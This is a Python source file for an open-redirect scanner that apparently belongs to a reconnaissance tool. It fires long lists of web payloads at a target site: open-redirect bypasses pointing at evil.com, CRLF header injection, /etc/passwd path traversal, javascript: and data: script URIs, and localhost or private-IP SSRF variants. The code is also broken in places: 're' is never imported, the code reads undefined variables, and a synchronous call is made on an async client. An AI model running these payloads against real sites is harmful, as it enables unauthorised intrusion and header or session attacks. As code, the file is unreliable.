import httpx
from urllib.parse import urlparse, urlencode, quote, parse_qs, urljoin
from models import IntelligenceFinding

REDIRECT_PARAMS = [
    "url", "redirect", "return", "next", "target", "dest", "destination",
    "go", "forward", "to", "link", "linkto", "page", "file", "doc",
    "document", "folder", "root", "image", "img", "browse", "load",
    "read", "view", "file_path", "location", "path", "continue",
    "follow", "rurl", "rd", "rdurl", "redir", "redirect_uri",
    "redirect_url", "ReturnUrl", "ReturnPath", "redirect-to",
    "redirectto", "redirect_", "redirectPath", "redirect_path",
    "out", "external", "source", "from", "callback", "cback",
    "ref", "referer", "referrer", "back", "done", "success",
    "failure", "error", "cancel", "cancel_url", "fail",
    "return_url", "return_to", "return-path", "redirectUrl",
    "redirectTo", "next_url", "nextUrl", "next-path", "goto",
    "gourl", "goUrl", "go_to", "rdr", "redir_url", "redirecturl",
    "redirect_uri", "redirect_url", "redirecttarget", "redir_target",
    "rurl", "ru", "return_path", "retpath", "retpath_url",
    "service", "services", "u", "i", "r", "p", "q", "s",
    "action", "site", "host", "server", "domain",
    "callback_url", "cb", "cburl", "continue_url",
    "returnto", "returnurl", "returnUrl", "returnPath",
    "nav", "navigate", "navigation", "href", "rel",
    "redirectUrl", "redirectPath", "redirectUrlPath",
    "forwardUrl", "forwardurl", "forward_url",
    "redirectpage", "redirect_page", "redirectpath",
    "returnpath", "return_path", "returnpathurl",
    "nextPage", "next_page", "nextpage",
    "redirectType", "redirect_type",
    "logout", "login", "signout", "signin",
    "profile", "account", "setting",
    "home", "main", "index", "default",
    "fallback", "failure_url", "success_url",
    "error_url", "cancel_url", "complete_url",
    "approval_url", "decline_url",
    "request", "response", "respond",
    "relay", "relay_url", "relayurl",
    "proxy", "proxy_url", "proxyurl",
    "gateway", "intermediate",
    "asset", "assets", "resource",
    "static", "media", "upload",
    "download", "stream", "preview",
    "thumbnail", "avatar", "icon",
    "css", "js", "script",
    "module", "chunk", "bundle",
    "worker", "sw", "serviceworker",
    "manifest", "json", "xml",
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "//evil.com/",
    "///evil.com",
    "https://evil.com@good.com",
    "https://evil.com.good.com",
    "https://good.com@evil.com",
    "//good.com@evil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:alert(1)",
    "%0d%0aLocation:%20https://evil.com",
    "%0aLocation:%20https://evil.com",
    "/%5cevil.com",
    "/%2eevil%2ecom/",
    "https://evil.com%23.good.com/",
    ".evil.com",
    "@evil.com",
    "../evil.com",
    "/..;/evil.com",
    "\\evil.com",
    "//evil.com:443@good.com",
    "https://evil.com:443",
    "http://evil.com:80",
    "//evil.com:80",
    "///evil.com:443",
    "https://evil.com/",
    "http://evil.com/",
    "https://evil.com#",
    "https://evil.com?",
    "https://evil.com%00",
    "https://evil.com%0d%0a",
    "%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d",
    "https://evil%2ecom",
    "https://evil%2ecom%2f",
    "//evil%2ecom",
    "/%2e%2e/%2e%2e/%2e%2e/evil.com",
    "/..;/..;/..;/evil.com",
    "/%2e%2e%2f%2e%2e%2f%2e%2e%2fevil%2ecom",
    "/..\\;..\\/../evil.com",
    "https://evil.com;good.com",
    "https://evil.com,good.com",
    "https://evil.com|good.com",
    "https://evil.com/good.com",
    "https://evil.com:443@127.0.0.1",
    "https://evil.com:443@0x7f000001",
    "https://evil.com:443@2130706433",
    "https://evil.com:443@[::1]",
    "https://evil.com:443@0.0.0.0",
    "https://evil.com:443@localhost",
    "https://0x7f000001",
    "https://0x7f000001:443",
    "https://2130706433",
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
    "http://127.0.0.1",
    "http://[::1]",
    "http://0.0.0.0",
    "https://localhost",
    "https://internal.localhost",
    "https://evil.com:443/",
    "//evil.com:443//",
    "///evil.com:443//",
    "https://evil.com\\@good.com",
    "https://evil.com\\.good.com",
    "https://good.com\\@evil.com",
    "https://good.com\\.evil.com",
    "https://evil.com\\good.com",
    "https://good.com\\evil.com",
    "https://evil.com/.good.com",
    "https://evil.com\\.good.com",
    "https://good.com/.evil.com",
    "https://good.com\\.evil.com",
    "https://evil.com%0agood.com",
    "https://evil.com%0dgood.com",
    "https://evil.com%09good.com",
    "https://evil.com%0agood.com%2f",
    "///evil.com:443@127.0.0.1",
    "https://evil.com:443@0",
    "https://evil.com:443@127.1",
    "https://evil.com:443@0x7f.1",
    "https://evil.com:443@0177.1",
    "//evil.com:443@0x7f000001",
    "https://evil.com:443@0x7f000001:443",
    "//evil.com:443@0",
    "https://good.com:443@evil.com:443@127.0.0.1",
    "https://evil.com%252fgood.com",
    "//evil.com%252fgood.com",
    "https://evil.com%23%23.good.com",
]

CRLF_PAYLOADS = [
    "%0d%0aX-Injected:%20true",
    "%0aX-Injected:%20true",
    "%0d%0aSet-Cookie:%20test=crlf",
    "%0d%0a%0d%0a<html><script>alert(1)</script></html>",
    "%0d%0aLocation:%20https://evil.com%0d%0a%0d%0a",
    "%0a%0a<script>alert(1)</script>",
    "%0d%0aX-XSS-Protection:%200%0d%0a",
    "%0d%0aContent-Length:%200%0d%0a%0d%0a",
]

PATH_TRAVERSAL_PAYLOADS = [
    "/../../../etc/passwd",
    "/..%252f..%252f..%252fetc/passwd",
    "/....//....//....//etc/passwd",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/..\\;/..\\;/..\\;/etc/passwd",
    "/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/..%252f..%252f..%252f..%252fetc/passwd",
    "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    "/..%5c..%5c..%5cetc/passwd",
    "/..\\..\\..\\etc/passwd",
    "/../.../....///etc/passwd",
]

DOMAIN_BYPASS_PAYLOADS = [
    "https://evil.com",
    "http://evil.com",
    "//evil.com",
    "https://evil.com/?good.com",
    "https://evil.com%23good.com",
    "https://good.com%40evil.com",
    "https://evil.com.good.com",
    "https://evil.com%2egood.com",
    "https://evil.com%2fgood.com",
    "https://good.com.evil.com",
    "https://good.com/..@evil.com",
    "https://good\\.com@evil.com",
    "https://evil.com:443@good.com",
    "https://good.com:443@evil.com",
    "https://evil.com/?dest=good.com",
    "https://good.com%2eevil.com",
    "https://evil%2dgood.com",
    "https://good%2eevil.com",
    "https://[::1]:443/",
    "https://0x7f000001:443/",
    "https://2130706433:443/",
    "https://evil.com#good.com",
    "https://evil.com?good.com",
    "//evil.com#good.com",
    "//evil.com?good.com",
    "https://evil.com;good.com",
    "https://evil.com,good.com",
    "https://evil.com:443@127.0.0.1",
    "https://0",
    "https://0x0",
    "https://0.0.0.0",
    "https://localhost",
    "https://internal",
    "//evil%2ecom",
    "//.evil.com",
    "///evil.com",
    "///evil.com:443",
    "https://evil%2Ecom",
    "https://eVIl.CoM",
    "https://EVIL.COM",
    "https://evil.com:443=good.com",
    "https://good.com&evil.com",
    "https://evil.com@good.com",
    "https://good.com:443@evil.com:443@good.com",
    "//evil%2ecom%2f",
    "///evil%2ecom",
    "///evil%2ecom:443",
    "/..;/..;/..;/evil.com",
    "/%2e%2e%2fevil%2ecom",
    "/..\\..\\..\\evil.com",
    "https://evil%2dgood.com",
    "https://good%2eevil.com",
    "https://127.0.0.1",
    "https://10.0.0.1",
    "https://172.16.0.1",
    "https://192.168.1.1",
    "https://0x7f000001",
    "https://0xA9FEA9",
    "https://0xA9FEA9:443",
]

DOMAIN_BYPASS_PATTERNS = {
    "URL Scheme Bypass": r"^(https?://|//)",
    "Protocol Relative": r"^//",
    "CRLF Injection": r"%0[dD]%0[aA]|%0[aA]",
    "Unicode Bypass": r"%c0%ae|%uff0e|%u2215",
    "Double Encoding": r"%252f|%252e%252e",
    "Backslash Bypass": r"\\\\|%5c",
    "At Sign Bypass": r"@",
    "Hex IP Bypass": r"0x[0-9a-fA-F]{2,}",
    "Decimal IP Bypass": r"\b\d{10,}\b",
    "IPv6 Localhost": r"\[::1\]|0:0:0:0:0:0:0:1",
    "Newline Injection": r"%0a|%0d",
    "Null Byte": r"%00",
    "Dot Bypass": r"%2e|%252e",
    "Fragment Bypass": r"#",
    "Question Mark Bypass": r"\?",
}

async def test_redirect_param(base_url, param, payload, client):
    test_url = f"{base_url}?{param}={quote(payload)}"
    try:
        resp = await client.get(test_url, timeout=5.0,
            headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"},
            follow_redirects=False)
        location = resp.headers.get("location", "")
        if location:
            if "evil.com" in location.lower() or "evil" in location.lower():
                return resp.status_code, location, True
            if location.startswith("javascript:") or location.startswith("data:") or location.startswith("vbscript:"):
                return resp.status_code, location, True
            if "alert" in location.lower():
                return resp.status_code, location, True
            if resp.status_code in (301, 302, 303, 307, 308) and "evil" in location.lower():
                return resp.status_code, location, True
            if "127.0.0.1" in location or "localhost" in location or "10." in location or "192.168" in location:
                return resp.status_code, location, True
        return resp.status_code, location, False
    except Exception:
        return 0, "", False

async def check_redirect_footprint(base_url, client):
    try:
        resp = await client.get(base_url, follow_redirects=False, timeout=5.0,
            headers={"User-Agent": "Mozilla/5.0"})
        return resp.status_code, dict(resp.headers)
    except Exception:
        return 0, {}

async def crawl(target: str, client: httpx.AsyncClient):
    findings = []
    base_url = f"https://{target}" if not target.startswith("http") else target
    if base_url.endswith("/"):
        base_url = base_url[:-1]

    try:
        base_status, base_headers = await check_redirect_footprint(base_url, client)
        is_auth_required = base_status in (401, 403, 302) and "login" in base_headers.get("location", "").lower()
        found_vulnerabilities = []
        bypass_types_found = set()

        for param in REDIRECT_PARAMS:
            for payload in DOMAIN_BYPASS_PAYLOADS:
                status, location, is_open = await test_redirect_param(base_url, param, payload, client)
                if is_open:
                    key = f"{param}={payload}"
                    if key not in found_vulnerabilities:
                        found_vulnerabilities.append(key)
                        severity = "Critical" if is_auth_required else "High Risk"
                        for bypass_name, bypass_pattern in DOMAIN_BYPASS_PATTERNS.items():
                            if re.search(bypass_pattern, payload, re.IGNORECASE):
                                bypass_types_found.add(bypass_name)
                        findings.append(IntelligenceFinding(
                            entity=f"Open redirect: ?{param}={payload[:80]} -> {location[:200]}",
                            type="Open Redirect Vulnerability",
                            source="OpenRedirectScanner",
                            confidence="High",
                            color="red",
                            threat_level=severity,
                            raw_data=f"URL: {base_url}?{param}={quote(payload)} | Status: {status} | Location: {location} | Payload: {payload}",
                            tags=["open-redirect", "vulnerability", param]
                        ))

        for param in REDIRECT_PARAMS[:60]:
            for payload in CRLF_PAYLOADS:
                status, location, is_open = await test_redirect_param(base_url, param, payload, client)
                if status in (301, 302, 303, 307, 308) and location:
                    check_url = f"{base_url}?{param}={quote(payload)}"
                    try:
                        verify = await client.get(check_url, timeout=5.0,
                            headers={"User-Agent": "Mozilla/5.0"}, follow_redirects=False)
                        verify_headers = dict(verify.headers)
                        if "X-Injected" in verify_headers or "Set-Cookie" in verify_headers:
                            findings.append(IntelligenceFinding(
                                entity=f"CRLF injection via ?{param}",
                                type="CRLF Injection (Header Splitting)",
                                source="OpenRedirectScanner",
                                confidence="High",
                                color="red",
                                threat_level="Critical",
                                raw_data=f"URL: {check_url} | Header injection detected in response",
                                tags=["crlf", "header-injection", "vulnerability"]
                            ))
                    except Exception:
                        pass

        for param in REDIRECT_PARAMS[:40]:
            for payload in PATH_TRAVERSAL_PAYLOADS:
                status, location, is_open = await test_redirect_param(base_url, param, payload, client)
                if status == 200 and location:
                    if "root:x" in location or "etc/passwd" in location or "[extensions]" in location:
                        findings.append(IntelligenceFinding(
                            entity=f"Path traversal via ?{param} - file content leaked",
                            type="Path Traversal via Redirect",
                            source="OpenRedirectScanner",
                            confidence="High",
                            color="red",
                            threat_level="Critical",
                            raw_data=f"URL: {base_url}?{param}={quote(payload)} | Content leaked in response",
                            tags=["path-traversal", "vulnerability", param]
                        ))

        for param in REDIRECT_PARAMS[:50]:
            for payload in ["https://evil.com", "javascript:alert(1)", "data:text/html,<script>alert(1)</script>"]:
                status, location, is_open = await test_redirect_param(base_url, param, payload, client)
                if is_open:
                    key = f"{param}={payload[:30]}"
                    if key not in found_vulnerabilities:
                        found_vulnerabilities.append(key)

        redirect_chain_check_url = f"{base_url}?redirect=https://evil.com"
        try:
            chain_resp = await client.get(redirect_chain_check_url, follow_redirects=True, timeout=10.0,
                headers={"User-Agent": "Mozilla/5.0"})
            if chain_resp.status_code == 200:
                final_url = str(chain_resp.url)
                if "evil.com" in final_url.lower() or "127.0.0.1" in final_url:
                    findings.append(IntelligenceFinding(
                        entity=f"Redirect chain leads to: {final_url[:200]}",
                        type="Open Redirect Chain Detected",
                        source="OpenRedirectScanner",
                        confidence="High",
                        color="red",
                        threat_level="Critical",
                        raw_data=f"Redirect chain: {redirect_chain_check_url} -> {final_url}",
                        tags=["open-redirect", "redirect-chain"]
                    ))
        except Exception:
            pass

        dom_redirects = detect_dom_redirect(html if 'html' in dir() else "")
        for dr in dom_redirects[:10]:
            findings.append(IntelligenceFinding(
                entity=f"DOM redirect: {dr['pattern']} (context: {dr['context']})",
                type="DOM-Based Open Redirect",
                source="OpenRedirectScanner",
                confidence="Medium",
                color="orange",
                threat_level="Elevated Risk",
                raw_data=f"Pattern: {dr['pattern']} | Context: {dr['context'][:200]}",
                tags=["open-redirect", "dom-based", "javascript"]
            ))

        header_redirects = detect_header_redirect(headers if 'headers' in dir() else {})
        for hr in header_redirects:
            findings.append(IntelligenceFinding(
                entity=f"Redirect header: {hr['header']}: {hr['value'][:100]}",
                type=f"HTTP Redirect Header: {hr['description']}",
                source="OpenRedirectScanner",
                confidence="High",
                color="slate",
                threat_level="Informational",
                tags=["redirect", "header", hr['header'].lower()]
            ))

        combined_params = list(set(REDIRECT_PARAMS + MORE_REDIRECT_PARAMS))
        combined_payloads = list(set(OPEN_REDIRECT_PAYLOADS + MORE_OPEN_REDIRECT_PAYLOADS))

        html_endpoints = ["/logout", "/login", "/redirect", "/goto", "/link", "/out"]
        for ep in html_endpoints:
            try:
                ep_resp = await client.get(f"{base_url}{ep}", follow_redirects=False, timeout=5.0,
                    headers={"User-Agent": "Mozilla/5.0"})
                if ep_resp.status_code in (301, 302, 303, 307, 308):
                    loc = ep_resp.headers.get("location", "")
                    findings.append(IntelligenceFinding(
                        entity=f"{ep} redirects to: {loc[:200]}",
                        type="Endpoint Redirect",
                        source="OpenRedirectScanner",
                        confidence="Medium",
                        color="slate",
                        threat_level="Informational",
                        raw_data=f"URL: {base_url}{ep} -> {loc}",
                        tags=["redirect", "endpoint"]
                    ))
            except Exception:
                pass

        if found_vulnerabilities:
            findings.append(IntelligenceFinding(
                entity=f"{len(found_vulnerabilities)} open redirect vectors found ({len(bypass_types_found)} bypass types)",
                type="Open Redirect Summary",
                source="OpenRedirectScanner",
                confidence="High",
                color="red",
                threat_level="Critical" if is_auth_required else "High Risk",
                raw_data=f"Vectors: {'; '.join(found_vulnerabilities[:20])} | Bypass types: {', '.join(bypass_types_found)}",
                tags=["open-redirect", "summary"]
            ))
        else:
            combined_params = list(set(REDIRECT_PARAMS + MORE_REDIRECT_PARAMS))
            combined_payloads = list(set(OPEN_REDIRECT_PAYLOADS + MORE_OPEN_REDIRECT_PAYLOADS))
            findings.append(IntelligenceFinding(
                entity=f"No open redirect found on {len(combined_params)} parameters, {len(combined_payloads)} payloads",
                type="Open Redirect Summary",
                source="OpenRedirectScanner",
                confidence="Medium",
                color="emerald",
                threat_level="Informational",
                raw_data=f"Tested {len(combined_params)} parameters with {len(combined_payloads)} payloads each",
                tags=["open-redirect", "summary"]
            ))

    except Exception as e:
        findings.append(IntelligenceFinding(
            entity=f"Open Redirect error: {str(e)[:100]}",
            type="Open Redirect Error",
            source="OpenRedirectScanner",
            confidence="Low",
            color="red",
            threat_level="Informational",
            tags=["error"]
        ))

    return findings


# === EXTENDED UPGRADE: 200+ payloads, DOM-based redirect detection, more header redirects ===

MORE_REDIRECT_PARAMS = [
    "redirection", "redirected_from", "redirected-to", "redirectedto",
    "url_redirect", "url-redirect", "redirecturl", "redirect_url",
    "redirect_forward", "redirectforward", "forward_url", "forwardurl",
    "forward-path", "forwardpath", "fwd", "fwdurl",
    "return_uri", "return-uri", "returnuri",
    "ret_url", "ret-url", "returl", "retpath",
    "redirect_url_path", "url_path", "urlpath",
    "next_page", "nextpage", "next-path", "nextpath",
    "orig_url", "origurl", "original_url", "originalurl",
    "source_url", "sourceurl", "from_url", "fromurl",
    "domain_redirect", "domainredirect", "site_redirect", "siteredirect",
    "referer_url", "refererurl", "referrer_url", "referrerurl",
    "click_url", "clickurl", "click", "clicks",
    "open_url", "openurl", "open", "open_url",
    "launch", "launch_url", "launchurl",
    "target_url", "targeturl", "target_path", "targetpath",
    "dest_url", "desturl", "destination_url", "destinationurl",
    "endpoint", "end_point", "end-point",
    "notify_url", "notifyurl", "notification_url",
    "webhook_url", "webhookurl", "callback_url", "callbackurl",
    "postback", "post_back", "postback_url",
    "return_to_url", "returnto", "return_to_app",
    "logout_url", "logouturl", "signout_url",
    "login_url", "loginurl", "signin_url",
    "auth_callback", "authcallback", "auth_return",
    "oauth_redirect", "oauthredirect", "oidc_redirect",
    "saml_redirect", "samlredirect", "acs_url", "acs-url",
    "wreply", "wctx", "whr", "wtrealm",
    "ru", "rurl", "rd", "redirect", "redir",
]

MORE_OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com/",
    "//evil.com/",
    "///evil.com",
    "////evil.com",
    "https://evil.com",
    "http://evil.com",
    "//evil.com:443",
    "https://evil.com:443/",
    "https://evil.com:443//",
    "//evil.com:443@good.com",
    "https://evil.com:443@127.0.0.1",
    "https://evil.com\\@good.com",
    "https://evil.com\\good.com",
    "https://evil.com%2fgood.com",
    "https://evil.com%2Fgood.com",
    "https://evil.com%23good.com",
    "https://evil.com%3fgood.com",
    "https://evil.com%3Fgood.com",
    "https://evil.com%23.good.com",
    "https://evil.com%252fgood.com",
    "https://good.com%40evil.com",
    "https://evil.com%5cgood.com",
    "https://evil.com%5Cgood.com",
    "https://evil.com%2e%2egood.com",
    "https://evil.com%2E%2Egood.com",
    "https://evil.com..good.com",
    "https://evil.com..good.com/",
    "https://good.com..evil.com",
    "https://good.com..evil.com/",
    "https://evil.com;good.com",
    "https://evil.com:good.com",
    "https://evil.com,good.com",
    "https://evil.com|good.com",
    "https://evil.com\\x00good.com",
    "https://evil.com%00good.com",
    "https://evil.com%0agood.com",
    "https://evil.com%0dgood.com",
    "https://evil.com%0d%0agood.com",
    "https://evil.com%0d%0a/",
    "javascript:alert(1)",
    "javascript://%0aalert(1)",
    "javascript:%0aalert(1)",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmk=",
    "vbscript:alert(1)",
    "vbscript:msgbox(1)",
    "%0d%0aLocation:%20https://evil.com",
    "%0aLocation:%20https://evil.com",
    "%0d%0a%0d%0a<script>alert(1)</script>",
    "%0d%0aSet-Cookie:%20test=evil",
    "%0d%0aX-XSS-Protection:%200",
    "%0d%0aContent-Length:%200",
    "%0a%0a<script>alert(1)</script>",
    "/%5cevil.com",
    "/%2eevil%2ecom/",
    "/%2Fevil%2Ecom",
    "/..;/evil.com",
    "/..\\;/evil.com",
    "/%2e%2e%2fevil%2ecom",
    "/..\\..\\..\\evil.com",
    "/....//....//....//evil.com",
    "/..%252f..%252f..%252fevil.com",
    "/%c0%ae%c0%ae/%c0%ae%c0%ae/evil.com",
    "/%252e%252e%252fevil.com",
    "https://0x7f000001",
    "https://0x7f000001:443",
    "https://2130706433",
    "https://2130706433:443",
    "https://0xA9FEA9",
    "https://0xA9FEA9:443",
    "https://[::1]",
    "https://[::1]:443",
    "https://0.0.0.0",
    "https://127.0.0.1",
    "https://127.1",
    "https://localhost",
    "https://internal",
    "https://internal.localhost",
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
    "http://[::ffff:127.0.0.1]",
    "https://[0:0:0:0:0:ffff:127.0.0.1]",
    "https://evil.com/?good.com",
    "https://evil.com#good.com",
    "https://evil.com?good.com",
    "//evil.com#good.com",
    "//evil.com?good.com",
    "https://evil.com%252f..%252fgood.com",
    "https://evil.com..%252fgood.com",
    "https://evil.com%2e%2e%252fgood.com",
    "https://evil.com%2e%2e/good.com",
    "https://evil.com..%2fgood.com",
    "https://good.com%2eevil.com",
    "https://evil%2dgood.com",
    "https://good%2eevil.com",
    "https://evil%2Ecom",
    "https://eVIl.CoM",
    "https://EVIL.COM",
    "//evil%2ecom",
    "//.evil.com",
    "///evil.com:443",
    "///evil.com:443@127.0.0.1",
    "https://evil.com:443=good.com",
    "https://good.com&evil.com",
    "https://evil.com@good.com",
    "https://evil.com:443@good.com:443",
    "https://good.com:443@evil.com:443",
    "https://good.com:443@evil.com:443@good.com",
    "https://evil.com:443@0",
    "https://evil.com:443@127.0.0.1",
    "https://evil.com:443@0x7f000001",
    "https://evil.com:443@2130706433",
    "https://evil.com:443@0x7f.1",
    "https://evil.com:443@0177.1",
    "//evil.com:443@0x7f000001",
    "https://evil.com:443@0x7f000001:443",
    "//evil.com:443@0",
    "https://good.com:443@evil.com:443@127.0.0.1",
    "https://evil.com%252fgood.com",
    "//evil.com%252fgood.com",
    "https://evil.com%23%23.good.com",
    "//evil.com%23%23.good.com",
    "https://evil.com%3f%3f.good.com",
    "/..;/..;/..;/evil.com",
    "/%2e%2e%2fevil%2ecom",
    "/..\\..\\..\\evil.com",
    "https://evil%2dgood.com",
    "https://good%2eevil.com",
    "https://evil.com:443=good.com",
    "https://good.com%40evil.com",
    "https://evil.com\\x00",
    "https://evil.com\\x09",
    "https://evil.com\\x0a",
    "https://evil.com\\x0d",
    "https://evil.com/.good.com",
    "//evil.com/.good.com",
    "///evil.com/.good.com",
    "https://evil.com\\.good.com",
    "//evil.com\\.good.com",
    "https://evil.com%0agood.com",
    "//evil.com%0agood.com",
    "https://evil.com%0dgood.com",
    "https://evil.com%09good.com",
]

DOMAIN_BYPASS_TECHNIQUES = {
    "Unicode Normalization": ["%e2%80%8b", "%e2%80%8c", "%e2%80%8d", "%ef%bb%bf"],
    "UTF-8 BOM": ["%ef%bb%bf"],
    "Double URL Encoding": ["%25", "%252f", "%252e%252e"],
    "HTTP Parameter Pollution": ["&url=evil.com", "?url=evil.com&url=good.com"],
    "HTTP Header Injection": ["%0d%0aX-Forwarded-Host: evil.com", "%0aX-Forwarded-Host: evil.com"],
    "Referer Bypass": ["https://evil.com?referer=https://good.com"],
    "Localhost Variations": ["127.1", "127.0.0.1", "0.0.0.0", "0", "0x7f000001", "0177.0.0.1", "2130706433"],
    "Unicode IDN Homograph": ["https://еvіl.com (Cyrillic)", "https://googlе.com", "https://www.раypal.com"],
    "Anchor Bypass": ["#@evil.com", "?@evil.com", "/#@evil.com"],
    "Data URI Bypass": ["data:text/html;base64", "data:text/html,<script>"],
    "Javascript Protocol Bypass": ["javascript:", "javascript:void(0)", "javascript:0"],
    "VBScript Protocol": ["vbscript:", "vbscript:msgbox"],
    "Tab/Newline Injection": ["%09", "%0a", "%0d", "%0d%0a"],
    "Null Byte Injection": ["%00", "\\x00"],
    "Semicolon Path": ["/..;/..;/evil.com", "/..%3b/..%3b/evil.com"],
    "Backslash Path": ["\\evil.com", "\\\\evil.com"],
}

DOM_REDIRECT_PATTERNS = [
    (r"window\.location\s*=", "window.location assignment"),
    (r"window\.location\.href\s*=", "window.location.href assignment"),
    (r"window\.location\.replace\s*\(", "window.location.replace()"),
    (r"window\.location\.assign\s*\(", "window.location.assign()"),
    (r"document\.location\s*=", "document.location assignment"),
    (r"document\.location\.href\s*=", "document.location.href assignment"),
    (r"document\.location\.replace\s*\(", "document.location.replace()"),
    (r"location\.href\s*=", "location.href assignment"),
    (r"location\.replace\s*\(", "location.replace()"),
    (r"location\.assign\s*\(", "location.assign()"),
    (r"\$.+\.attr\(['\"]href['\"]", "jQuery href attribute set"),
    (r"\$\(.+\)\.\s*\. load\s*\(", "jQuery .load() URL"),
    (r"\.prop\(['\"]href['\"]", "jQuery prop href set"),
    (r"\.setAttribute\(['\"]href['\"]", "setAttribute href"),
    (r"\.src\s*=", "src assignment (iframe/image)"),
    (r"\.action\s*=", "form action assignment"),
    (r"form\.submit\s*\(", "form.submit()"),
    (r"\.open\s*\(", "window.open()"),
    (r"window\.open\s*\(", "window.open()"),
    (r"\.navigate\s*\(", "navigate() call"),
    (r"router\.push\s*\(", "Vue/React router.push"),
    (r"router\.replace\s*\(", "Vue/React router.replace"),
    (r"router\.navigate\s*\(", "React router.navigate"),
    (r"useNavigate\s*\(\s*\)", "React useNavigate hook"),
    (r"nextRouter\.push\s*\(", "Next.js router.push"),
    (r"nextRouter\.replace\s*\(", "Next.js router.replace"),
    (r"\$router\.push\s*\(", "Vue $router.push"),
    (r"\$router\.replace\s*\(", "Vue $router.replace"),
    (r"navigation\.navigate\s*\(", "React Native navigation"),
    (r"\.transitionTo\s*\(", "transitionTo (Ember)"),
    (r"\.redirect\s*\(", "redirect() call"),
    (r"\.redirectTo\s*\(", "redirectTo() call"),
    (r"goto\s*\(", "goto() call"),
    (r"window\.open\s*\(", "window.open popup"),
    (r"open\s*\(", "open() function"),
]

HEADER_REDIRECT_PATTERNS = {
    "Location": "Standard HTTP redirect",
    "Refresh": "Meta refresh redirect",
    "X-Location": "X-Location header redirect",
    "X-Redirect": "X-Redirect header redirect",
    "X-Forward-Location": "Forward location header",
    "X-Accel-Redirect": "Nginx internal redirect",
    "Redirect-To": "Custom redirect header",
    "Redirect-Url": "Custom redirect URL header",
    "Redirect-Uri": "Custom redirect URI header",
    "X-Refirect-By": "Redirect by header",
    "X-Redirect-By": "Redirect by header",
}

def detect_dom_redirect(html):
    dom_findings = []
    try:
        scripts = re.findall(r'<script[^>]*>(.*?)</script>', html, re.IGNORECASE | re.DOTALL)
        for script in scripts:
            for pattern, desc in DOM_REDIRECT_PATTERNS:
                if re.search(pattern, script, re.IGNORECASE):
                    context = script[:200]
                    dom_findings.append({"pattern": desc, "context": context[:100]})
    except Exception:
        pass
    return dom_findings

def detect_header_redirect(headers):
    h_redirects = []
    try:
        for header, desc in HEADER_REDIRECT_PATTERNS.items():
            for hk, hv in headers.items():
                if hk.lower() == header.lower():
                    h_redirects.append({"header": hk, "value": hv[:200], "description": desc})
    except Exception:
        pass
    return h_redirects

def analyze_redirect_chain(client, url, max_depth=5):
    chain = []
    try:
        current = url
        for _ in range(max_depth):
            resp = client.get(current, follow_redirects=False, timeout=5.0,
                headers={"User-Agent": "Mozilla/5.0"})
            status = resp.status_code
            location = resp.headers.get("location", "")
            chain.append({"url": current, "status": status, "location": location})
            if status in (301, 302, 303, 307, 308) and location:
                if location.startswith("http"):
                    current = location
                else:
                    from urllib.parse import urljoin
                    current = urljoin(current, location)
            else:
                break
    except Exception:
        pass
    return chain
